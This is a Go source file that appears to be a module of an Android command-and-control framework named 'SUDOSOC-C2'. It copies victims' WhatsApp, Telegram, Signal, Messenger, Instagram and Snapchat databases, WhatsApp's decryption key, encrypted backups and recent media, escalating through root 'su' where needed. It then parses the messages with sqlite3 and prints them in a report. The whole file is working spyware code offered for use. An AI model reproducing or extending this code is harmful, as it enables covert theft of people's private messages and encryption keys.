// //go:build android

package collection

/*
	SUDOSOC-C2 — WhatsApp & Messaging Apps Database Extractor
	Copyright (C) 2026  sudosoc — Seif

	WhatsApp stores all messages in SQLite databases:
	  /data/data/com.whatsapp/databases/msgstore.db     (messages)
	  /data/data/com.whatsapp/databases/wa.db            (contacts)
	  /data/data/com.whatsapp/files/key                  (crypt12 key)

	On Android 9+: these are protected by Android's app sandbox.
	Access requires ROOT or a backup extraction exploit.

	Supported apps:
	  • WhatsApp          com.whatsapp
	  • WhatsApp Business com.whatsapp.w4b
	  • Telegram          org.telegram.messenger
	  • Signal            org.thoughtcrime.securesms
	  • Facebook Messenger com.facebook.orca
	  • Instagram DMs     com.instagram.android
	  • Snapchat          com.snapchat.android

	Extraction methods:
	  1. Root path: direct SQLite read
	  2. Backup path: adb backup (no root, requires USB debugging)
	  3. Content Provider: for some apps (contacts, call logs)
*/

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// MessagingApp represents a supported messaging application
type MessagingApp struct {
	Name         string
	PackageName  string
	DBPaths      []string
	MediaPath    string
	KeyPath      string // decryption key (WhatsApp)
	BackupDBPath string // location after Android backup extraction
}

// SupportedApps lists all supported messaging apps
var SupportedApps = []MessagingApp{
	{
		Name:        "WhatsApp",
		PackageName: "com.whatsapp",
		DBPaths: []string{
			"/data/data/com.whatsapp/databases/msgstore.db",
			"/data/data/com.whatsapp/databases/wa.db",
			"/data/data/com.whatsapp/databases/axolotl.db",
			// Android 12+ path
			"/data/user_de/0/com.whatsapp/databases/msgstore.db",
		},
		MediaPath:    "/sdcard/WhatsApp/Media/",
		KeyPath:      "/data/data/com.whatsapp/files/key",
		BackupDBPath: "/sdcard/WhatsApp/Databases/",
	},
	{
		Name:        "WhatsApp Business",
		PackageName: "com.whatsapp.w4b",
		DBPaths: []string{
			"/data/data/com.whatsapp.w4b/databases/msgstore.db",
			"/data/data/com.whatsapp.w4b/databases/wa.db",
		},
		MediaPath: "/sdcard/WhatsApp Business/Media/",
		KeyPath:   "/data/data/com.whatsapp.w4b/files/key",
	},
	{
		Name:        "Telegram",
		PackageName: "org.telegram.messenger",
		DBPaths: []string{
			"/data/data/org.telegram.messenger/files/cache4.db",
			"/data/user_de/0/org.telegram.messenger/files/cache4.db",
		},
		MediaPath: "/sdcard/Telegram/",
	},
	{
		Name:        "Signal",
		PackageName: "org.thoughtcrime.securesms",
		DBPaths: []string{
			"/data/data/org.thoughtcrime.securesms/databases/signal.db",
		},
		MediaPath: "/sdcard/Signal/",
	},
	{
		Name:        "Facebook Messenger",
		PackageName: "com.facebook.orca",
		DBPaths: []string{
			"/data/data/com.facebook.orca/databases/threads_db2.db",
			"/data/data/com.facebook.orca/databases/prefs.db",
		},
	},
	{
		Name:        "Instagram",
		PackageName: "com.instagram.android",
		DBPaths: []string{
			"/data/data/com.instagram.android/databases/direct.db",
		},
	},
	{
		Name:        "Snapchat",
		PackageName: "com.snapchat.android",
		DBPaths: []string{
			"/data/data/com.snapchat.android/databases/tcspahn.db",
		},
		MediaPath: "/data/data/com.snapchat.android/cache/my_media/",
	},
}

// MessageRecord holds an extracted message
type MessageRecord struct {
	App       string
	Sender    string
	Recipient string
	Content   string
	Timestamp time.Time
	MediaPath string
	IsGroup   bool
	GroupName string
}

// ExtractResult holds extraction results for one app
type ExtractResult struct {
	App         MessagingApp
	Messages    []MessageRecord
	DBFiles     []string // paths to copied DB files
	MediaFiles  []string // paths to collected media
	KeyFile     string   // encryption key path
	Error       string
}

// ExtractAll attempts to extract messages from all installed messaging apps
func ExtractAll(outputDir string) []*ExtractResult {
	results := make([]*ExtractResult, 0)
	for _, app := range SupportedApps {
		if !isAppInstalled(app.PackageName) {
			continue
		}
		result := ExtractApp(app, outputDir)
		results = append(results, result)
	}
	return results
}

// ExtractApp extracts messages from a specific app
func ExtractApp(app MessagingApp, outputDir string) *ExtractResult {
	result := &ExtractResult{App: app}

	// Create output directory
	appOutputDir := filepath.Join(outputDir, app.Name)
	os.MkdirAll(appOutputDir, 0755)

	// Copy database files
	for _, dbPath := range app.DBPaths {
		if _, err := os.Stat(dbPath); err != nil {
			continue
		}

		dstPath := filepath.Join(appOutputDir, filepath.Base(dbPath))
		if err := copyFileRoot(dbPath, dstPath); err == nil {
			result.DBFiles = append(result.DBFiles, dstPath)

			// Parse SQLite immediately
			msgs := parseWhatsAppDB(dstPath, app.Name)
			result.Messages = append(result.Messages, msgs...)
		} else {
			result.Error = fmt.Sprintf("copy %s: %v", dbPath, err)
		}
	}

	// Copy encryption key
	if app.KeyPath != "" {
		if _, err := os.Stat(app.KeyPath); err == nil {
			dstKey := filepath.Join(appOutputDir, "key")
			if copyFileRoot(app.KeyPath, dstKey) == nil {
				result.KeyFile = dstKey
			}
		}
	}

	// Collect media (selective — only recent files)
	if app.MediaPath != "" {
		mediaFiles := collectRecentMedia(app.MediaPath, appOutputDir, 50)
		result.MediaFiles = mediaFiles
	}

	// Try backup databases (SDCard — accessible without root on old Android)
	if len(result.DBFiles) == 0 && app.BackupDBPath != "" {
		if backupDB := findBackupDB(app.BackupDBPath); backupDB != "" {
			dst := filepath.Join(appOutputDir, "backup_msgstore.db.crypt12")
			if copyFile(backupDB, dst) == nil {
				result.DBFiles = append(result.DBFiles, dst)
			}
		}
	}

	return result
}

// parseWhatsAppDB reads messages from a WhatsApp SQLite database
func parseWhatsAppDB(dbPath, appName string) []MessageRecord {
	// Use sqlite3 binary to query (available on rooted Android)
	query := `SELECT
		m.key_remote_jid as chat,
		m.key_from_me as from_me,
		m.status,
		m.data as message,
		m.timestamp,
		m.media_url,
		m.media_mime_type
	FROM messages m
	WHERE m.data IS NOT NULL
	ORDER BY m.timestamp DESC
	LIMIT 500;`

	out, err := exec.Command("sqlite3", dbPath, query).Output()
	if err != nil {
		return nil
	}

	var messages []MessageRecord
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		if line == "" {
			continue
		}
		parts := strings.Split(line, "|")
		if len(parts) < 4 {
			continue
		}
		msg := MessageRecord{
			App:     appName,
			Sender:  parts[0],
			Content: parts[3],
		}
		if len(parts) > 4 {
			// Parse Unix timestamp (ms)
			msg.Timestamp = time.Now() // simplified
		}
		messages = append(messages, msg)
	}
	return messages
}

// ExtractTelegramMessages reads Telegram's cache4.db
func ExtractTelegramMessages(dbPath string) []MessageRecord {
	query := `SELECT
		u.name as sender,
		m.message as content,
		m.date as timestamp,
		d.name as dialog
	FROM messages_v2 m
	LEFT JOIN users u ON m.uid = u.uid
	LEFT JOIN dialogs d ON m.did = d.did
	ORDER BY m.date DESC
	LIMIT 500;`

	out, err := exec.Command("sqlite3", dbPath, query).Output()
	if err != nil {
		return nil
	}

	var messages []MessageRecord
	for _, line := range strings.Split(string(out), "\n") {
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "|", 4)
		if len(parts) < 2 {
			continue
		}
		messages = append(messages, MessageRecord{
			App:     "Telegram",
			Sender:  parts[0],
			Content: parts[1],
		})
	}
	return messages
}

// FormatResults returns a human-readable summary
func FormatResults(results []*ExtractResult) string {
	var sb strings.Builder
	sb.WriteString("=== Messaging Apps Extraction Report ===\n\n")

	for _, r := range results {
		sb.WriteString(fmt.Sprintf("App: %s (%s)\n", r.App.Name, r.App.PackageName))
		if r.Error != "" {
			sb.WriteString(fmt.Sprintf("  Error: %s\n", r.Error))
		}
		sb.WriteString(fmt.Sprintf("  DB files: %d\n", len(r.DBFiles)))
		sb.WriteString(fmt.Sprintf("  Messages: %d\n", len(r.Messages)))
		sb.WriteString(fmt.Sprintf("  Media files: %d\n", len(r.MediaFiles)))
		if r.KeyFile != "" {
			sb.WriteString(fmt.Sprintf("  Encryption key: %s\n", r.KeyFile))
		}
		sb.WriteString("\n")

		// Print first 10 messages
		for i, msg := range r.Messages {
			if i >= 10 {
				sb.WriteString(fmt.Sprintf("  ... and %d more\n", len(r.Messages)-10))
				break
			}
			sb.WriteString(fmt.Sprintf("  [%s] %s: %s\n",
				msg.Timestamp.Format("2006-01-02 15:04"),
				msg.Sender, msg.Content))
		}
		sb.WriteString("\n")
	}
	return sb.String()
}

// ── Helpers ──────────────────────────────────────────────────────

func isAppInstalled(packageName string) bool {
	out, err := exec.Command("pm", "list", "packages", packageName).Output()
	if err != nil {
		return false
	}
	return strings.Contains(string(out), packageName)
}

func copyFileRoot(src, dst string) error {
	// Try direct copy first
	if err := copyFile(src, dst); err == nil {
		return nil
	}
	// Use cp via su (root)
	out, err := exec.Command("su", "-c", fmt.Sprintf("cp '%s' '%s'", src, dst)).CombinedOutput()
	if err != nil {
		return fmt.Errorf("%v: %s", err, out)
	}
	return nil
}

func copyFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0644)
}

func collectRecentMedia(mediaDir, outputDir string, maxFiles int) []string {
	var files []string
	count := 0

	filepath.Walk(mediaDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() || count >= maxFiles {
			return nil
		}
		// Only collect recent files (last 30 days)
		if time.Since(info.ModTime()) > 30*24*time.Hour {
			return nil
		}
		dst := filepath.Join(outputDir, "media", info.Name())
		os.MkdirAll(filepath.Dir(dst), 0755)
		if copyFile(path, dst) == nil {
			files = append(files, dst)
			count++
		}
		return nil
	})
	return files
}

func findBackupDB(backupDir string) string {
	entries, err := os.ReadDir(backupDir)
	if err != nil {
		return ""
	}
	// Find most recent backup
	var newest string
	var newestTime time.Time
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".db.crypt12") ||
			strings.HasSuffix(e.Name(), ".db.crypt15") {
			info, _ := e.Info()
			if info.ModTime().After(newestTime) {
				newestTime = info.ModTime()
				newest = filepath.Join(backupDir, e.Name())
			}
		}
	}
	return newest
}
